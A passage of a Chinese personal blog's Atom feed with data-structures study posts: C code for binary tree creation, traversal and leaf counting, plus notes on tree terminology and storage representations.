class="line"><span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">inorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">postorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/11/ieurZmqRlgCPcGt.png" alt="image-20211111233134578"></p><p>测试以上图 二叉树 为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">前序遍历结果：abdefgc</span><br><span class="line">    输入：abd#<span class="meta">#ef##g##c##</span></span><br><span class="line">中序遍历结果：dbfegac</span><br><span class="line">后序遍历结果：dfgebca</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/13/IvMHoaLZWmV8TyN.png" alt="image-20211113085744734"></p><p><img src="https://i.loli.net/2021/11/13/8VzkgG5Pq32cKli.png" alt="image-20211113085800931"></p><p><img src="https://i.loli.net/2021/11/13/2mUsZEbpYzlMLHD.png" alt="image-20211113085816823"></p><p><img src="https://i.loli.net/2021/11/13/KWZMfnJghjyIqaD.png" alt="image-20211113085827862"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>Struggling</title>
    <link href="https://xizhi-future.github.io/2021/11/07/Struggling/"/>
    <id>https://xizhi-future.github.io/2021/11/07/Struggling/</id>
    <published>2021-11-07T04:52:59.000Z</published>
    <updated>2021-11-07T04:57:27.852Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/07/Aj7dS1eMpwxmlqH.jpg" alt="1636260982008"><img src="https://i.loli.net/2021/11/07/DUbOPSBcTtnlmCN.jpg" alt="IMG_20211029_205703"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>二叉树_题</title>
    <link href="https://xizhi-future.github.io/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/"/>
    <id>https://xizhi-future.github.io/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/</id>
    <published>2021-11-06T03:34:01.000Z</published>
    <updated>2021-11-07T04:51:29.255Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"><a href="#分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数" class="headerlink" title="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"></a>分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数</h3><p><strong><code>bintree.h</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> *a; </span><br><span class="line"><span class="comment">/* 如果在定义点之前的函数想引用该全局变量，则应该在引用之前用关键字 extern 对该变量作“外部变量声明”，表示该变量是一个已经定义的外部变量 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//链式存储，不带双亲</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;binnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> binnode *bintree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的 创建</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(bintree *t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch = *a++;</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        *t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        *t = (bintree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(binnode));</span><br><span class="line">        (*t)-&gt;data = ch;</span><br><span class="line">        create(&amp;(*t)-&gt;lchild);</span><br><span class="line">        create(&amp;(*t)-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前序 递归 遍历 二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈 定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    bintree data[N];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化 顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top &gt; <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//不为空</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否 满</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">full</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == N<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">//满</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//不满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!full(s))</span><br><span class="line">        s-&gt;data[++s-&gt;top] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!empty(s))</span><br><span class="line">        <span class="keyword">return</span> s-&gt;data[s-&gt;top--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>333.cpp</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归方法求 二叉树 叶子结点的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">             <span class="keyword">return</span> lefts_1(t-&gt;lchild) + lefts_1(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归方法 求 二叉树 叶子结点的 个数  (需要使用到顺序栈)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_2</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    init(&amp;s);</span><br><span class="line">    <span class="keyword">while</span>(t || !empty(&amp;s))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">                count++;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    bintree t;</span><br><span class="line">    create(&amp;t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_1(t));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;非递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_2(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p><p>以上面的二叉树为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/cMHT2U5hE6zfgjO.png" alt="image-20211106112844209"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>树型结构</title>
    <link href="https://xizhi-future.github.io/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/"/>
    <id>https://xizhi-future.github.io/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/</id>
    <published>2021-10-30T09:48:21.000Z</published>
    <updated>2021-10-30T09:51:16.228Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="树型结构"><a href="#树型结构" class="headerlink" title="树型结构"></a>树型结构</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>树：n &gt;= 0  个结点的有限集合，一棵树是由根和它的子树构成，子树又由子树的根和更小的子树构成。</p><p>空树：n = 0</p><p>森林：一棵树中每个结点的子树多构成的集合，即在森林中的每棵树加上一个共同的根，森林就成为了一颗树。</p><hr><p>上端结点、下端结点</p><p>双亲（父母、前件）</p><p>子女（孩子、后件）</p><p>兄弟</p><p>祖先</p><p>子孙</p><hr><p>某结点的度：该结点所拥有的子女数</p><p>树的度：树中所有结点度的最大值</p><p>树枝：树中连接两个结点的线段</p><p>树的深度（高度）：树的层次数</p><hr><p>终端结点（叶子结点）：度为 0 的结点</p><p>非终端结点（分支结点）：度不为 0 的结点</p><p>路径：从某结点开始沿着自上而下的顺序到达另一个结点，称该路径</p><p>路径的长度：是所经过的树枝的条数</p><p>树形结构的表示方法：括号表示法、嵌套集合表示法、凹入表示法</p><p><img src="https://i.loli.net/2021/10/30/Jl2scUvpjQnIqAu.png" alt="image-20211030152824457"></p><p><img src="https://i.loli.net/2021/10/30/cdGO7smFBlHT1k4.png" alt="image-20211030152839890"></p><p><img src="https://i.loli.net/2021/10/30/g9nOytLS2KNFMhT.png" alt="image-20211030152926106"></p><p><img src="https://i.loli.net/2021/10/30/lPRDXKLTpjYtf9s.png" alt="image-20211030152853872"></p><hr><p>有序树</p><p>无序树</p><p>例：下面的树，若看成是有序树则不相等；若肯成是无序树，则可看作是相等的。</p><p><img src="https://i.loli.net/2021/10/30/myhJ65nSTzoePEK.png" alt="image-20211030152648707"></p><h2 id="1-2-树的存储结构"><a href="#1-2-树的存储结构" class="headerlink" title="1.2 树的存储结构"></a>1.2 树的存储结构</h2><h3 id="1-2-1-双亲表示法-—–-一维数组"><a href="#1-2-1-双亲表示法-—–-一维数组" class="headerlink" title="1.2.1 双亲表示法 —– 一维数组"></a>1.2.1 双亲表示法 —– 一维数组</h3><p>data  parent</p><p>根结点 双亲 值 定义为 -1，root 位置定为 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;   <span class="comment">//根据树中结点的具体类型进行定义，这里我们假设是字符型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;<span class="comment">//结点的类型</span></span><br><span class="line">    <span class="keyword">int</span> parent;<span class="comment">//结点双亲的下表</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tree</span>&#123;</span></span><br><span class="line">    node treelist[MAXSIZE];<span class="comment">//存放结点的数组</span></span><br><span class="line">    <span class="keyword">int</span> length,root;   <span class="comment">//树中实际所含结点的个数  根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/oeaRhzFCUY5O8ws.png" alt="image-20211030154321554"></p><h3 id="1-2-2-孩子表示法-—–-三种"><a href="#1-2-2-孩子表示法-—–-三种" class="headerlink" title="1.2.2 孩子表示法 —– 三种"></a>1.2.2 孩子表示法 —– 三种</h3><p><strong>指针方式 孩子表示法</strong> —- <strong>指针数组</strong></p><p>每个结点：两个域</p><p>值域：data </p><p>指针数组（每个元素是一个指向该结点子女的指针）：child[m]</p><p>度为m的树，其指针数组的大小即是 m</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3  <span class="comment">//树的度数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">child</span>[<span class="title">m</span>];</span> <span class="comment">//指向子女的指针数组</span></span><br><span class="line">&#125;node,*tree;</span><br><span class="line"></span><br><span class="line">tree root;<span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/SeQ3faz8ACvqj2R.png" alt="image-20211030154722206"></p><p><strong>数组方式 孩子表示法</strong> —- <strong>一维数组</strong></p><p>每个结点：域个数不定</p><p>值域：data</p><p>一维数组：child[m]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> child[m];</span><br><span class="line">&#125;treenode;</span><br><span class="line"></span><br><span class="line">treenode tree[MAXSIZE]; <span class="comment">//存储树结点的数组</span></span><br><span class="line"><span class="keyword">int</span> root;  <span class="comment">//根结点 下标</span></span><br><span class="line"><span class="keyword">int</span> length; <span class="comment">//树中实际所含结点个数</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/pBfqKovTHn976gs.png" alt="image-20211030155400513"></p><blockquote><p><strong>指针方式和数组方式孩子表示法缺点：</strong></p><p>每个结点所含子女个数不知道，不相同，则 child 数组的大小仅仅由 树的度决定，则会造成 空间的闲置与浪费。</p><p><strong>解决：链表方式孩子表示法</strong></p></blockquote><p><strong>链表方式 孩子表示法</strong></p><p>每个结点：两个域</p><p>值域：data</p><p>指针域（指向该结点的第一个子女）</p><p>每个结点子女 又 排列起来形成一个单链表，n 个结点 n 个单链表</p><p>再使用数组存储单链表的头指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span>&#123;</span>  <span class="comment">//孩子结点类型：单链表</span></span><br><span class="line">    <span class="keyword">int</span> child;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;chnode,*chpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>    <span class="comment">//树中每个结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    chpoint firstchild;<span class="comment">//指向第一个子女结点的指针</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//树的类型</span></span><br><span class="line">    node treelist[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length,root;  <span class="comment">//树中实际所含结点个数、根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/CgNt4ZrSkA6UiKM.png" alt="image-20211030160016424"></p><blockquote><p><strong>链表方式孩子表示法</strong> 虽然可以建立动态的链表，但是又要额外需要空间来存放一个指向下一个子女的指针 next，<strong>又增加了空间的开销</strong>。</p></blockquote><p>应根据实际情况进行存储方式的选择。</p><h3 id="1-2-3-孩子兄弟表示法-（二叉树表示法）"><a href="#1-2-3-孩子兄弟表示法-（二叉树表示法）" class="headerlink" title="1.2.3 孩子兄弟表示法 （二叉树表示法）"></a>1.2.3 孩子兄弟表示法 （二叉树表示法）</h3><p>每个结点：三个域     </p><p>值域：data</p><p>两个指针域：firstchild  rightchild (分别指向该结点的第一个子女和其右兄弟)  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>  <span class="comment">//树的结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">firstchild</span>,*<span class="title">rightsibling</span>;</span>  <span class="comment">//第一个子女、右兄弟</span></span><br><span class="line">&#125;node,*pnode;</span><br><span class="line"></span><br><span class="line">pnode root; <span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/VIs7XdeYLw5HTfx.png" alt="image-20211030161221026"></p><h2 id="1-3-树的遍历"><a href="#1-3-树的遍历" class="headerlink" title="1.3 树的遍历"></a>1.3 树的遍历</h2><p>按照某种规定的顺序访问树中每一个结点，且每个结点仅仅只能访问一次</p><h3 id="1-3-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-3-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.3.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.3.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><h3 id="1-3-2-后序遍历-—-左-gt-右-gt-根"><a href="#1-3-2-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.3.2 后序遍历 —- 左-&gt;右-&gt;根"></a>1.3.2 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><h3 id="1-3-3-层次遍历-—-上至下，左至右"><a href="#1-3-3-层次遍历-—-上至下，左至右" class="headerlink" title="1.3.3 层次遍历 —- 上至下，左至右"></a>1.3.3 层次遍历 —- <code>上至下，左至右</code></h3><p><img src="https://i.loli.net/2021/10/30/52LIEUyk7gorXsZ.png" alt="image-20211030162231970"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>那一年</title>
    <link href="https://xizhi-future.github.io/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/"/>
    <id>https://xizhi-future.github.io/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/</id>
    <published>2021-10-26T13:00:00.000Z</published>
    <updated>2021-10-26T13:07:43.969Z</updated>
    
